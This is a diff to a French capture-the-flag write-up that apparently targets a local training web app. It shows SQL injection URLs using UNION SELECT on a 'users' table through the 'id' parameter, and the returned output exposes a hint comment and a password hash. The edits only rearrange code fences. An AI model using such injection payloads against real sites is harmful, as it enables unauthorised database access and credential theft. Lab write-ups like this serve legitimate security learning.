@@ -88,7 +88,8 @@ en fouillant dans chacune d'elle, on trouve que comment affiche ceci :
 
 ```url
     http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20Commentaire%20FROM%20users
-
+```url
+```
     http://localhost:8080/index.php?page=member&Submit=Submit&id=0%20UNION%20SELECT%201,%20countersign%20FROM%20users    
 ```
 
@@ -96,7 +97,8 @@ en fouillant dans chacune d'elle, on trouve que comment affiche ceci :
     ID: 0 UNION SELECT 1, Commentaire FROM users 
     First name: 1
     Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
-
+```
+```shell
     ID: 0 UNION SELECT 1, countersign FROM users 
     First name: 1
     Surname : 5ff9d0165b4f92b14994e5c685cdce28
